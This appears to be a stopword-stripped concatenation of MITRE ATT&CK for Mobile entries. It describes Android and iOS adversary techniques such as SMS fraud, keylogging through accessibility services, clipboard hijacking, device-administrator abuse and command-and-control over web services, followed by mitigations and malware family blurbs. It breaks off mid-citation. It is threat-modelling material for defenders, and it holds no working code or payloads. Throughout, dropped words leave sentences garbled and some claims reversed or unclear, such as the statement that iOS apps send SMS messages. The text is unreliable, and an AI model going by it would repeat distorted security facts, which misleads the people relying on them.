Malicious applications perform toll billing, occurs carriers provide payment endpoints page. application connects cellular data carrier verify number, application retrieve code SMS enter page.(Citation: Google Bread)

On iOS, apps send SMS messages.

On Android, apps hold `SEND_SMS` permission send SMS messages. Additionally, Android version 4.2 mitigations threat requiring user consent allowing SMS messages premium (Citation: AndroidSecurity2014). iOS application maliciously claim URL scheme, allowing intercept calls meant application(Citation: FireEye-Masque2)(Citation: Dhanjani-URLScheme). technique, example, capture OAuth authorization codes(Citation: IETF-PKCE) phish user credentials(Citation: MobileIron-XARA). Adversaries existing, legitimate external service channel sending commands receiving output compromised system. Compromised systems leverage popular websites social media host command control (C2) instructions. infected systems send output commands service channel. return traffic occur variety ways, depending service utilized. example, return traffic form compromised posting comment forum, issuing pull request development project, updating document hosted service, sending Tweet. 

 

Popular websites social media, acting mechanism C2, cover. likelihood hosts network communicating prior compromise. common services, offered Google Twitter, easier adversaries hide expected noise. service providers commonly SSL/TLS encryption, adversaries level protection.  Adversaries generate network traffic protocol port paring typically associated. example, HTTPS port 8088 port 587 opposed traditional port 443. Adversaries standard port protocol bypass filtering muddle analysis/parsing network data. Adversaries manipulate application software prior receipt final consumer purpose data compromise. Supply chain compromise software ways, including manipulation application source code, manipulation update/distribution mechanism software, replacing compiled releases modified version. Adversaries existing, legitimate external service host additional command control (C2) infrastructure. Adversaries post content, dead drop resolver, services embedded (and obfuscated/encoded) domains IP addresses. infected, victims reach redirected resolvers. 

 

Popular websites social media, acting mechanism C2, cover. likelihood hosts network communicating prior compromise. common services, offered Google Twitter, easier adversaries hide expected noise. service providers commonly SSL/TLS encryption, adversaries level protection. 

 

Use dead drop resolver protect back-end C2 infrastructure discovery malware binary analysis, enable operational resiliency (since infrastructure dynamically changed).  Adversaries track device’s physical location standard operating APIs malicious exploited applications compromised device. 

 

On Android, applications holding `ACCESS_COAURSE_LOCATION` `ACCESS_FINE_LOCATION` permissions provide access device’s physical location. Android up, declaration `ACCESS_BACKGROUND_LOCATION` permission application’s manifest applications request location access application running background.(Citation: Android Request Location Permissions) adversaries utilized integration Baidu map services retrieve geographical location location access permissions obtained.(Citation: PaloAlto-SpyDealer)(Citation: Palo Alto HenBox) 

 

On iOS, applications include `NSLocationWhenInUseUsageDescription`, `NSLocationAlwaysAndWhenInUseUsageDescription`, `NSLocationAlwaysUsageDescription` `Info.plist` file depending extent requested access location information.(Citation: Apple Requesting Authorization Location Services) iOS 8.0 up, applications `requestWhenInUseAuthorization()` request access location application `requestAlwaysAuthorization()` request access location application use. elevated privileges, adversary access location data explicit user consent `com.apple.locationd.preauthorized` entitlement key.(Citation: Google Project Insomnia) Adversaries abuse Android’s device administration API degree control device. abusing API, adversaries perform nefarious actions, resetting device’s password [Endpoint Denial Service](https://attack.mitre.org/techniques/T1642), factory resetting device [File Deletion](https://attack.mitre.org/techniques/T1630/002) delete traces malware, disabling device’s cameras, difficult uninstall app.

Device administrators approved user runtime, popup actions requested app. conjunction techniques, [Input Injection](https://attack.mitre.org/techniques/T1516), app programmatically grant administrator permissions user input. adversary seek lock legitimate user device, inhibit user interaction ransom payment.

On Android versions prior 7, apps abuse Device Administrator access reset device lock passcode prevent user unlocking device. Android 7, device profile owners (e.g. MDMs) reset device’s passcode.(Citation: Android resetPassword)

On iOS devices, technique mobile device management servers remove screen lock passcode, set passcode. However, jailbroken devices, malware discovered lock user device.(Citation: Xiao-KeyRaider) adversary access cloud services (e.g. Google's Android Device Manager Apple iCloud's iPhone) enterprise mobility management (EMM)/mobile device management (MDM) server console track location mobile devices managed service.(Citation: Krebs-Location)  escalated privileges, adversary program mobile device impersonate USB devices input devices (keyboard mouse), storage devices, networking devices attack physically connected PC(Citation: Wang-ExploitingUSB)(Citation: ArsTechnica-PoisonTap) technique demonstrated Android. unaware demonstrations iOS. adversary set rogue cellular base station eavesdrop manipulate cellular device communication. compromised cellular femtocell carry technique(Citation: Computerworld-Femtocell). adversary convince mobile network operator (e.g. social networking, forged identification, insider attacks performed trusted employees) issue SIM card associate existing phone account.(Citation: NYGov-Simswap)(Citation: Motherboard-Simswap2) adversary SMS messages hijack phone calls intended else.(Citation: Betanews-Simswap)

One intercepting authentication messages phone calls illicit access online banking online accounts, online services account password resets sending authentication code SMS phone account.(Citation: Guardian-Simswap)(Citation: Motherboard-Simswap1)(Citation: Krebs-SimSwap)(Citation: TechCrunch-SimSwap) Adversaries methods capturing user input credentials collect information. normal device usage, users provide credentials locations, login pages/portals dialog boxes. Input capture mechanisms transparent user (e.g. [Keylogging](https://attack.mitre.org/techniques/T1417/001)) rely deceiving user providing input genuine application prompt (e.g. [GUI Input Capture](https://attack.mitre.org/techniques/T1417/002)). Adversaries generate outbound traffic devices. typically performed manipulate external outcomes, achieve carrier billing fraud manipulate app store rankings ratings. Outbound traffic typically generated SMS messages traffic, forms well.

If SMS messages, Android apps hold `SEND_SMS` permission. Additionally, sending SMS message requires user consent recipient premium number. Applications send SMS messages iOS adversary knowledge techniques security software evade detection.(Citation: Brodie)(Citation: Tan) example, mobile security products perform compromised device detection searching artifacts installed "su" binary, check evaded naming binary else. Similarly, polymorphic code techniques evade signature-based detection.(Citation: Rastogi) adversary distribute developed malware masquerading malware legitimate application. ways: embedding malware legitimate application, pretending legitimate application.

Embedding malware legitimate application downloading application, disassembling it, adding malicious code, re-assembling it.(Citation: Zhou) app original app, additional malicious functionality. adversary publish malicious application app stores delivery method.

Pretending legitimate application relies heavily lack scrutinization user. Typically, malicious app pretending legitimate details legitimate one, name, icon, description.(Citation: Palo Alto HenBox)

Malicious applications masquerade legitimate applications requesting access accessibility service legitimate user, increasing likelihood access granted. Adversaries utilize standard operating APIs gather calendar entry data. Android, accomplished Calendar Content Provider. iOS, accomplished `EventKit` framework. 

 

If device jailbroken rooted, adversary access [Calendar Entries](https://attack.mitre.org/techniques/T1636/001) user’s knowledge approval.  Adversaries wipe device delete individual files manipulate external outcomes hide activity. application administrator access wipe device, individual files require special permissions delete depending storage location.(Citation: Android DevicePolicyManager 2019) 

Stored data include variety file formats, Office files, databases, stored emails, custom file formats. impact file deletion depends type data goals objectives adversary, include deleting update files evade detection deleting attacker-specified files impact. adversary seek inhibit user interaction locking legitimate user device. typically accomplished requesting device administrator permissions locking screen `DevicePolicyManager.lockNow()`. techniques locking user device observed, persistent overlay, carefully crafted “call” notification screens, locking foreground. techniques difficult around, typically require booting device safe mode uninstall malware.(Citation: MalLockerB)(Citation: Talos GPlayed)(Citation: securelist rotexy 2018)

Prior Android 7, device administrators reset device lock passcode prevent user unlocking device. release Android 7 introduced updates device profile owners (e.g. MDMs) reset device’s passcode.(Citation: Android resetPassword) Adversaries log user keystrokes intercept credentials user user types them.

Some methods keylogging include:

* Masquerading legitimate third-party keyboard record user keystrokes.(Citation: Zeltser-Keyboard) Android iOS, users explicitly authorize third-party keyboard apps. Users advised extreme caution granting authorization requested.
* Abusing accessibility features. Android, adversaries abuse accessibility features record keystrokes registering `AccessibilityService` class, overriding `onAccessibilityEvent` method, listening `AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED` event type. event object passed function data user typed. 
*Additional methods keylogging root access available. 
 Adversaries delete, alter, send SMS messages user authorization. hide C2 SMS messages, spread malware, external effects.

This accomplished requesting `RECEIVE_SMS` `SEND_SMS` permissions depending malware attempting do. app set default SMS handler device, `SMS_DELIVER` broadcast intent registered, app write SMS content provider. content provider modifies messaging database device, malicious applications ability insert, modify, delete arbitrary messages device.(Citation: SMS KitKat)(Citation: Android SmsProvider) adversary knowledge techniques security software evade detection(Citation: Brodie)(Citation: Tan). example, mobile security products perform compromised device detection searching artifacts installed "su" binary, check evaded naming binary else. Similarly, polymorphic code techniques evade signature-based detection(Citation: Rastogi). Adversaries attempt exfiltrate data network medium command control channel. command control network standard Internet connection, exfiltration occur, example, Bluetooth, radio frequency (RF) channel. 

Adversaries choose sufficient access proximity, connection secured defended primary Internet-connected channel routed enterprise network.  Adversaries inject code processes evade process-based defenses elevate privileges. Process injection method executing arbitrary code address space separate live process. Running code context process access process's memory, system/network resources, elevated privileges. Execution process injection evade detection security products execution masked legitimate process. 

Both Android iOS legitimate achieve process injection. abusing existing root access exploiting vulnerability. Adversaries employ symmetric encryption algorithm conceal command control traffic, relying inherent protections communication protocol. Symmetric encryption algorithms key plaintext encryption ciphertext decryption. Common symmetric encryption algorithms include AES, Blowfish, RC4. intent message passed Android application components. Applications register receive broadcast intents runtime, system-wide intents delivered app events happen device, network user unlocking screen. Malicious applications trigger actions app based broadcast intent received.

Further, malicious applications register intents broadcasted applications addition Android itself. malware respond based actions applications. behavior typically intimate knowledge, targeting specific devices, users, applications.

In Android 8 (API level 26), broadcast intent behavior changed, limiting implicit intents applications register manifest. cases, applications register manifest receive broadcasts. Now, applications register context-specific broadcast receivers user actively app.(Citation: Android Broadcasts) Adversaries manipulate hardware components products prior receipt final consumer purpose data compromise. modifying hardware firmware supply chain, adversaries insert backdoor consumer networks difficult detect adversary degree control system.  Adversaries abuse clipboard manager APIs sensitive copied device clipboard. example, passwords copied pasted password manager application captured malicious application installed device.(Citation: Fahl-Clipboard) 

 

On Android, applications `ClipboardManager.OnPrimaryClipChangedListener()` API register listener monitor clipboard changes. However, starting Android 10, application foreground, set device’s default input method editor (IME).(Citation: Github Capture Clipboard 2019)(Citation: Android Privacy Changes) 

 

On iOS, accomplished accessing `UIPasteboard.general.string` field. However, starting iOS 14, accessing clipboard, user notification accessed originated application. example, user copies iMessage Messages application, notification read “application_name pasted Messages” pasted application.(Citation: UIPPasteboard) adversary escalate privileges, privileges malicious code device partition, persist device resets easily removed device user.

Many Android devices provide ability unlock bootloader development purposes. unlocked bootloader provide ability adversary modify partition. bootloader locked, adversary escalate privileges modify partition. Adversaries insert, delete, alter data manipulate external outcomes hide activity. manipulating data, adversaries attempt affect business process, organizational understanding, decision making.

The type modification impact depends target application, process, goals objectives adversary. complex systems, adversary special expertise access specialized software system, typically gained prolonged gathering campaign, desired impact. Adversaries utilize standard operating APIs gather SMS messages. Android, accomplished SMS Content Provider. iOS standard API access SMS messages. 

If device jailbroken rooted, adversary access [SMS Messages](https://attack.mitre.org/techniques/T1636/004) user’s knowledge approval.  Adversaries existing, legitimate external service relaying data to/from compromised system. Popular websites social media, acting mechanism C2, cover. likelihood hosts network communicating prior compromise. common services, offered Google Twitter, easier adversaries hide expected noise. service providers commonly SSL/TLS encryption, adversaries level protection. 

 

Use services protect back-end C2 infrastructure discovery malware binary analysis, enable operational resiliency (since infrastructure dynamically changed). 

  Adversaries execute malicious payloads hijacking operating applications. Hijacking execution flow purposes persistence hijacked execution reoccur time. 


On Android, adversaries overwrite standard OS API library malicious alternative hook core functions achieve persistence. this, adversary’s code executed time overwritten API function called app infected device. Adversaries search common password storage locations user credentials. Passwords stored device, depending operating application holding credentials. specific applications store passwords easier users manage maintain. credentials obtained, perform lateral movement access restricted information. Adversaries utilize hooking hide presence artifacts behaviors evade detection. Hooking modify return values data structures APIs function calls. process typically involves 3rd party root frameworks, Xposed Magisk, exploit pre-existing root access. including custom modules root frameworks, adversaries hook APIs alter return data structures alter functionality/visibility aspects system. adversary attempt install insecure malicious configuration settings mobile device, phishing emails messages configuration settings attachment, link configuration settings. device user tricked installing configuration settings social engineering techniques (Citation: Symantec-iOSProfile).

For example, unwanted Certification Authority (CA) certificate device's trusted certificate store, increasing device's susceptibility adversary-in-the-middle network attacks seeking eavesdrop manipulate device's network communication ([Eavesdrop Insecure Network Communication](https://attack.mitre.org/techniques/T1439) [Manipulate Device Communication](https://attack.mitre.org/techniques/T1463)).

On iOS, malicious Configuration Profiles unwanted Certification Authority (CA) certificates insecure settings unwanted proxy server VPN settings route device's network traffic adversary's system. device enrolled malicious Mobile Device Management (MDM) (Citation: Talos-MDM). Adversaries enumerate files directories search specific device locations desired filesystem. Adversaries [File Directory Discovery](https://attack.mitre.org/techniques/T1420) automated discovery shape follow-on behaviors, including deciding adversary infect target attempt specific actions. 

On Android, Linux file permissions SELinux policies typically stringently restrict accessed apps advantage privilege escalation exploit. contents external storage directory visible, concerns sensitive data inappropriately stored there. iOS's security architecture restricts ability perform type [File Directory Discovery](https://attack.mitre.org/techniques/T1420) escalated privileges.  Adversaries attempt payload file difficult discover analyze encrypting, encoding, obfuscating contents device transit. common behavior platforms network evade defenses. 
 
Payloads compressed, archived, encrypted avoid detection. payloads Initial Access mitigate detection. Portions files encoded hide plaintext strings defenders discovery. Payloads split separate, seemingly benign files reveal malicious functionality reassembled.(Citation: MalLockerB)  malicious application inject input user interface mimic user interaction abuse Android's accessibility APIs.

[Input Injection](https://attack.mitre.org/techniques/T1516) achieved methods:

* Mimicking user clicks screen, steal money user's PayPal account.(Citation: android-trojan-steals-paypal-2fa)
* Injecting global actions, `GLOBAL_ACTION_BACK` (programatically mimicking physical button press), trigger actions behalf user.(Citation: Talos Gustuff Apr 2019)
* Inserting input fields behalf user. method legitimately auto-fill fields applications password managers.(Citation: bitwarden autofill logins) Adversaries perform Network Denial Service (DoS) attacks degrade block availability targeted resources users. Network DoS performed exhausting network bandwidth services rely on, jamming signal coming devices. 

A Network DoS occur adversary jam radio signals (e.g. Wi-Fi, cellular, GPS) device prevent communicating. example, jam cellular signal, adversary handheld signal jammer, jam devices jammer’s operational range.(Citation: NIST-SP800187) 

Usage cellular jamming documented arrests reported news.(Citation: CNET-Celljammer)(Citation: NYTimes-Celljam)(Citation: Digitaltrends-Celljam)(Citation: Arstechnica-Celljam) Adversaries modify applications installed device establish persistent access victim. malicious modifications legitimate applications carry adversary tasks applications use.

There multiple adversary inject malicious code applications. method advantages device vulnerabilities, well-known Janus, Android vulnerability adversaries add extra bytes APK (application) DEX (executable) files file's signature. add arbitrary bytes valid applications, attackers seamlessly inject code genuine executables user's knowledge.(Citation: Guardsquare Janus)

Adversaries rebuild applications include malicious modifications. achieved decompiling genuine application, merging malicious code, recompiling it.(Citation: CheckPoint Agent Smith)

Adversaries action conceal modifications application executables bypass user consent. actions include altering modifications update exploiting vulnerabilities activities malicious application application.(Citation: CheckPoint Agent Smith) Adversaries establish persistence mechanisms trigger execution based specific events. Mobile operating systems subscribe events receiving SMS message, device boot completion, device activities. 

Adversaries abuse mechanisms maintaining persistent access victim automatically repeatedly executing malicious code. gaining access victim’s system, adversaries create modify event triggers malicious content executed event trigger invoked.  Adversaries details network configuration settings, IP MAC addresses, operating systems access discovery remote systems. 

 

On Android, details onboard network interfaces accessible apps `java.net.NetworkInterface` class.(Citation: NetworkInterface) Previously, Android `TelephonyManager` class gather telephony-related device identifiers, IMSI, IMEI, phone number. However, starting Android 10, preloaded, carrier, default SMS, device profile owner applications access telephony-related device identifiers.(Citation: TelephonyManager) 

 

On iOS, gathering network configuration root access. 

 

Adversaries [System Network Configuration Discovery](https://attack.mitre.org/techniques/T1422) automated discovery shape follow-on behaviors, including determining access target network actions next.  network traffic mobile device remote server securely protected, attacker positioned network manipulate network communication detected. example, FireEye researchers 2014 68% 1,000 applications Google Play Store Transport Layer Security (TLS) implementation vulnerability applications' network traffic adversary-in-the-middle attacks (Citation: FireEye-SSL). adversary leverage device’s cameras gather capturing video recordings. Images captured, intervals, lieu video files.  

 

Malware scripts interact device cameras API operating system. Video image files written disk exfiltrated later. technique differs [Screen Capture](https://attack.mitre.org/techniques/T1513) device’s cameras video recording capturing victim’s screen. 

 

In Android, application hold `android.permission.CAMERA` permission access cameras. iOS, applications include `NSCameraUsageDescription` key `Info.plist` file. cases, user grant permission requesting application camera. device rooted jailbroken, adversary access camera knowledge user.   Adversaries existing, legitimate external service channel sending commands compromised receiving return output. Compromised systems leverage popular websites social media host command control (C2) instructions. infected systems opt send output commands C2 channel, including distinct service. Alternatively, compromised systems return output adversaries send instructions systems response. 

 

Popular websites social media, acting mechanism C2, cover. likelihood hosts network communicating prior compromise. common services, offered Google Twitter, easier adversaries hide expected noise. service providers commonly SSL/TLS encryption, adversaries level protection.  Malicious applications common attack vector adversaries gain presence mobile devices. Mobile devices configured application installation authorized app store Google Play Store Apple App Store). adversary seek malicious application authorized app store, enabling application installed targeted devices.

App stores typically require developer registration vetting techniques identify malicious applications. Adversaries techniques app store defenses:

* [Download Code Runtime](https://attack.mitre.org/techniques/T1407)
* [Obfuscated Files Information](https://attack.mitre.org/techniques/T1406)

Adversaries seek evade vetting placing code malicious application detect running app analysis environment and, so, avoid performing malicious actions analysis. (Citation: Petsas) (Citation: Oberheide-Bouncer) (Citation: Percoco-Bouncer) (Citation: Wang)

Adversaries fake identities, payment cards, etc., create developer accounts publish malicious applications app stores. (Citation: Oberheide-Bouncer)

Adversaries control target's Google account Google Play Store's remote installation capability install apps Android devices Google account. (Citation: Oberheide-RemoteInstall) (Citation: Konoth) (Only applications download Google Play Store remotely installed technique.) adversary encrypt files stored mobile device prevent user accessing them. extract monetary compensation victim exchange decryption decryption key (ransomware) render data permanently inaccessible key saved transmitted. Adversaries abuse Android device administration API prevent user uninstalling target application. earlier versions Android, device administrator applications administration capabilities explicitly deactivated user application uninstalled. updated user deactivate uninstall administrator application step.

Adversaries abuse device accessibility APIs prevent removal. set APIs application perform actions behalf user programmatically determine screen. malicious application monitor device screen modals confirmation modal uninstall application) inject screen input button tap close modal. Adversaries attempt listing network connections compromised device accessing remote systems querying network. 

 

This typically accomplished utilizing device APIs collect nearby networks, Wi-Fi, Bluetooth, cellular tower connections. Android, querying respective APIs: 

 

* `WifiInfo` current Wi-Fi connection, nearby Wi-Fi networks. Querying `WiFiInfo` API requires application hold `ACCESS_FINE_LOCATION` permission. 

* `BluetoothAdapter` Bluetooth devices, requires application hold permissions granted user runtime. 

* Android versions prior Q, applications `TelephonyManager.getNeighboringCellInfo()` method. later, applications `TelephonyManager.getAllCellInfo()` method. methods require application hold `ACCESS_FINE_LOCATION` permission. adversary physical access mobile device seek bypass device’s lockscreen. methods exist accomplish this, including:

* Biometric spoofing: biometric authentication used, adversary attempt spoof mobile device’s biometric authentication mechanism. iOS Android partly mitigate attack requiring device’s passcode biometrics unlock device device restart, set random time.(Citation: SRLabs-Fingerprint)(Citation: TheSun-FaceID)
* Unlock code bypass: adversaries attempt brute-force guess lockscreen passcode (typically PIN password), including physically observing (“shoulder surfing”) device owner’s lockscreen passcode. Mobile OS vendors partly mitigate implementing incremental backoff timers set failed unlock attempts, configurable device wipe failed unlock attempts.
* Vulnerability exploit: Techniques periodically demonstrated exploit mobile devices bypass lockscreen. vulnerabilities patched device OS vendor disclosed.(Citation: Wired-AndroidBypass)(Citation: Kaspersky-iOSBypass)
 Adversaries built-in command-line interfaces interact device execute commands. Android bash interacted Android Debug Bridge (ADB) programmatically Java’s `Runtime` package. iOS, adversaries interact underlying runtime device jailbroken.

If device rooted jailbroken, adversaries locate invoke superuser binary elevate privileges interact root user. dangerous level permissions adversary special commands modify protected files. Adversaries utilize standard operating APIs gather contact list data. Android, accomplished Contacts Content Provider. iOS, accomplished `Contacts` framework. 

 

If device jailbroken rooted, adversary access [Contact List](https://attack.mitre.org/techniques/T1636/003) user’s knowledge approval.  Adversaries search local sources, file systems local databases, files sensitive data prior exfiltration.  

 

Access local data, includes stored operating system, requires escalated privileges. Examples local data include authentication tokens, device keyboard cache, Wi-Fi passwords, photos. Android, adversaries attempt access files external storage require additional storage-related permissions. 

  Adversaries interrupt availability network resources inhibiting access accounts utilized legitimate users. Accounts deleted, locked, manipulated (ex: credentials changed) remove access accounts.  Adversaries attempt detailed device’s operating hardware, including versions, patches, architecture. Adversaries [System Discovery](https://attack.mitre.org/techniques/T1426) automated discovery shape follow-on behaviors, including infects target attempts specific actions. 

 

On Android, programmatically accessible applications `android.os.Build` class. (Citation: Android-Build) iOS restrictive visible applications. Typically, applications query device model version iOS running.  Adversaries abuse clipboard functionality intercept replace Android device clipboard.(Citation: ESET Clipboard Modification February 2019)(Citation: Welivesecurity Clipboard Modification February 2019)(Citation: Syracuse Clipboard Modification 2014) Malicious applications monitor clipboard activity <code>ClipboardManager.OnPrimaryClipChangedListener</code> interface Android determine clipboard contents changed.(Citation: Dr.Webb Clipboard Modification origin2 August 2018)(Citation: Dr.Webb Clipboard Modification origin August 2018) Listening clipboard activity, reading clipboard contents, modifying clipboard contents requires explicit application permissions performed applications running background, however, behavior changed release Android 10.(Citation: Android Privacy Changes)

Adversaries [Clipboard Modification](https://attack.mitre.org/techniques/T1510) replace prior pasted, example, replacing copied Bitcoin wallet address wallet address adversarial control.

[Clipboard Modification](https://attack.mitre.org/techniques/T1510) Android/Clipper.C trojan. sample detected ESET application distributed Google Play Store targeting cryptocurrency wallet numbers.(Citation: ESET Clipboard Modification February 2019) Adversaries compress encrypt data collected prior exfiltration. Compressing data obfuscate contents minimize network resources. Encryption hide exfiltrated detection exfiltration conspicuous inspection defender. 

 

Both compression encryption prior exfiltration, performed utility, programming library, custom algorithm.   Adversaries device’s geographical location limit malicious behaviors. example, malware operators limit distribution stage payload geographic regions.(Citation: Lookout eSurv)

[Geofencing](https://attack.mitre.org/techniques/T1627/001) is accomplished persuading user grant application permission access location services. application collect, process, exfiltrate device’s location perform location-based actions, ceasing malicious behavior region-specific advertisements. 

One method accomplish [Geofencing](https://attack.mitre.org/techniques/T1627/001) on Android built-in Geofencing API automatically trigger behaviors device enters exits radius geographical location.  other [Geofencing](https://attack.mitre.org/techniques/T1627/001) methods, requires user granted `ACCESS_FINE_LOCATION` `ACCESS_BACKGROUND_LOCATION` permissions. required application targets Android (API level 29) higher. However, Android 11 introduced additional permission controls restrict background location collection based user permission choices runtime. additional controls include "Allow app", effectively prohibit background location collection.  

Similarly, iOS, developers built-in APIs setup execute geofencing. Depending case, app call `requestWhenInUseAuthorization()` or `requestAlwaysAuthorization()`, depending access location services required. Android, users option limit application access device’s location, including one-time application running foreground.  

[Geofencing](https://attack.mitre.org/techniques/T1627/001) can prevent exposure capabilities environments intended compromised operated within. example, location data limit malware spread capabilities, evade application analysis environments (ex: malware analysis target geographic area). malicious usages include language-specific input prompts advertisements. Adversaries device sensors collect nearby networks, Wi-Fi Bluetooth. malicious application capture sensitive data SMS, including authentication credentials. SMS frequently transmit codes multi-factor authentication.

On Android, malicious application request permission (either app install time time) receive SMS messages. Alternatively, malicious application attempt perform operating privilege escalation attack bypass permission requirement.

On iOS, applications access SMS messages normal operation, adversary attempt perform operating privilege escalation attack access SMS messages. Adversaries perform Endpoint Denial Service (DoS) attacks degrade block availability services users.

On Android versions prior 7, apps abuse Device Administrator access reset device lock passcode, preventing user unlocking device. Android 7, device profile owners (e.g. MDMs) reset device’s passcode.(Citation: Android resetPassword)

On iOS devices, technique mobile device management servers remove screen lock passcode; set passcode. However, jailbroken devices, malware discovered lock user device.(Citation: Xiao-KeyRaider) Adversaries communicate compromised devices band data streams. variety reasons, including evading network traffic monitoring, backup method command control, data exfiltration device connected Internet-providing networks cellular Wi-Fi). band data streams exist, SMS messages, NFC, Bluetooth. 

 

On Android, applications read push notifications capture content SMS messages, band data streams. requires user manually grant notification access application settings menu. However, application launch Intent user there. 

 

On iOS, programmatically read push notifications.  Adversaries explicitly employ encryption algorithm conceal command control traffic relying inherent protections communication protocol. secure algorithm, implementations vulnerable reverse engineering secret encoded generated malware samples/configuration files. malicious app attack vector exploit vulnerabilities code running Trusted Execution Environment (TEE) (Citation: Thomas-TrustZone). adversary privileges held TEE including ability access cryptographic sensitive data (Citation: QualcommKeyMaster). Escalated operating privileges required ability attack TEE (Citation: EkbergTEE). not, privileges TEE exploit operating (Citation: laginimaineb-TEE). malicious application suppress icon displayed user application launcher. hides installed, difficult user uninstall application. Hiding application's icon programmatically require special permissions. 

This behavior BankBot/Spy Banker family malware.(Citation: android-trojan-steals-paypal-2fa)(Citation: sunny-stolen-credentials)(Citation: bankbot-spybanker) 

Beginning Android 10, introduced inhibit malicious applications’ ability hide icon. app app, requests permissions, launcher activity, application’s icon hidden. Further, device managed application profile, icon hidden. Otherwise, synthesized activity shown, launcher icon represents app’s details settings. user clicks synthesized activity launcher, application’s details settings.(Citation: Android Limitations Hiding App Icons)(Citation: LauncherApps getActivityList) adversary escalate privileges, privileges malicious code device's Trusted Execution Environment (TEE) isolated execution environment code evade detection, persist device resets, removable device user. Running code TEE provide adversary ability monitor tamper device behavior.(Citation: Roth-Rootkits) adversary mobile device secure protocols, jamming frequencies protocols LTE allowing protocols GSM communicate(Citation: NIST-SP800187). secure protocols communication easier eavesdrop manipulate. adversary seek generate fraudulent advertising revenue mobile devices, triggering automatic clicks advertising links user involvement. Adversaries steganography techniques prevent detection hidden information. Steganographic techniques hide data digital media images, audio tracks, video clips, files. adversary exploit signaling vulnerabilities redirect calls messages (SMS) phone attacker's control. adversary adversary-in-the-middle intercept manipulate communication. (Citation: Engel-SS7) (Citation: Engel-SS7-2008) (Citation: 3GPP-Security) (Citation: Positive-SS7) (Citation: CSRIC5-WG10-FinalReport) Interception SMS messages enable adversaries authentication codes multi-factor authentication(Citation: TheRegister-SS7). Adversaries attempt hide artifacts behaviors evade detection. Mobile operating systems features developer APIs hide artifacts, application’s launcher icon. APIs legitimate usages, hiding icon avoid application drawer clutter application usable interface. Adversaries abuse features APIs hide artifacts user evade detection. Adversaries modify code signing policies enable execution applications signed unofficial unknown keys. Code signing level authenticity app developer, guaranteeing program tampered official source. Security controls include enforcement mechanisms ensure valid, signed code device. 

Mobile devices enable security controls default, preventing installation unknown applications Android. Adversaries modify policies ways, including [Input Injection](https://attack.mitre.org/techniques/T1516) malicious configuration profiles. Adversaries [Domain Generation Algorithms](https://attack.mitre.org/techniques/T1637/001) (DGAs) procedurally generate domain names command control communication   malicious application distribution.(Citation: securelist rotexy 2018)

DGAs increase difficulty defenders block, track, command control channel, thousands domains malware check instructions. Adversaries gain access user visiting normal browsing. technique, user's browser typically targeted exploitation, adversaries compromised websites non-exploitation behavior acquiring [Application Access Token](https://attack.mitre.org/techniques/T1550/001).

Multiple delivering exploit code browser exist, including:

* legitimate compromised adversaries injected form malicious code JavaScript, iFrames, cross-site scripting.
* Malicious ads paid served legitimate providers.
* Built-in application interfaces leveraged insertion object display content script executes visiting client (e.g. forum posts, comments, user controllable content).

Often adversary visited specific community, government, industry, region, goal compromise specific user set users based shared interest. targeted attack referred strategic compromise watering hole attack. examples occurring.(Citation: Lookout-StealthMango)

Typical drive-by compromise process:

1. user visits host adversary controlled content.
2. Scripts automatically execute, typically searching versions browser plugins vulnerable version. 
    * user required assist process enabling scripting active components ignoring warning dialog boxes.
3. finding vulnerable version, exploit code delivered browser.
4. exploitation successful, adversary code execution user's protections place.
    * visit initial scan required exploit code delivered. malicious application suppress icon displayed user application launcher hide installed, difficult user uninstall application. Hiding application's icon programmatically require special permissions.

This behavior BankBot/Spy Banker family malware.(Citation: android-trojan-steals-paypal-2fa)(Citation: sunny-stolen-credentials)(Citation: bankbot-spybanker) mobile operating versions bring patches discovered vulnerabilities bring security architecture improvements provide resilience potential vulnerabilities weaknesses discovered. bring improvements block observed adversary techniques. Enterprises vet applications exploitable vulnerabilities unwanted (privacy-invasive malicious) behaviors. Enterprises inspect applications third-party service.

Enterprises impose policies pre-approved applications installed devices impose policies block specific applications issues. Bring Device (BYOD) environments, enterprises impose policies enterprise-managed portion device.

Application Vetting complete mitigation. Techniques [Evade Analysis Environment](https://attack.mitre.org/techniques/T1523) exist enable adversaries bypass vetting. enterprise mobility management (EMM), mobile device management (MDM), provision policies mobile devices control aspects allowed behavior. Describes guidance training users set configuration settings avoid specific risky behaviors. Ensure Android devices include enable Verified Boot capability, cryptographically ensures integrity partition. Application developers encrypt application network traffic Transport Layer Security (TLS) protocol ensure protection sensitive data deter network-based attacks. desired, application developers perform message-based encryption data passing TLS encryption.

iOS's App Transport Security feature ensure application network traffic appropriately protected. Apple intends mandate App Transport Security  (Citation: TechCrunch-ATS) apps Apple App Store justification given.

Android's Network Security Configuration feature app developers ensure application network traffic appropriately protected  (Citation: Android-NetworkSecurityConfig).

Use Virtual Private Network (VPN) tunnels, e.g. IPsec protocol, mitigate types network attacks well. devices provide capability unlock bootloader (hence allowing operating code flashed device), perform periodic checks ensure bootloader locked. Install security updates response discovered vulnerabilities.

Purchase devices vendor mobile carrier commitment provide security updates prompt manner set period time.

Decommission devices receive security updates.

Limit block access enterprise resources devices installed security updates.

On Android devices, access controlled based device's security patch level. iOS devices, access controlled based iOS version. variety methods exist enable enterprises identify compromised (e.g. rooted/jailbroken) devices, security mechanisms built device, third-party mobile security applications, enterprise mobility management (EMM)/mobile device management (MDM) capabilities, methods. methods trivial evade sophisticated. mitigate Signaling 7 (SS7) exploitation, Communications, Security, Reliability, Interoperability Council (CSRIC) describes filtering interconnections network operators block inappropriate requests (Citation: CSRIC5-WG10-FinalReport). Warn device users accept requests grant Device Administrator access applications reason.

Additionally, application vetting include check application requests Device Administrator access. Applications request Device Administrator access carefully scrutinized allowed valid reason exists. Enable remote attestation capabilities (such Android SafetyNet Samsung Knox TIMA Attestation) prohibit devices fail attestation accessing enterprise resources. [Bouncing Golf](https://attack.mitre.org/groups/G0097) cyberespionage campaign targeting Middle Eastern countries.(Citation: Trend Micro Bouncing Golf 2019) [CarbonSteal](https://attack.mitre.org/software/S0529) family surveillanceware tools share common C2 infrastructure. [CarbonSteal](https://attack.mitre.org/software/S0529) deals audio surveillance. (Citation: Lookout Uyghur Campaign) [Cerberus](https://attack.mitre.org/software/S0480) banking trojan usage rented underground forums marketplaces. Prior rent, authors [Cerberus](https://attack.mitre.org/software/S0480) claim private operations years.(Citation: Threat Fabric Cerberus) [DroidJack](https://attack.mitre.org/software/S0320) Android remote access tool observed posing legitimate applications including Super Mario Pokemon games. (Citation: Zscaler-SuperMarioRun) (Citation: Proofpoint-Droidjack) [Rotexy](https://attack.mitre.org/software/S0411) Android banking malware evolved years. originally SMS spyware Trojan spotted October 2014, evolved features, including ransomware functionality.(Citation: 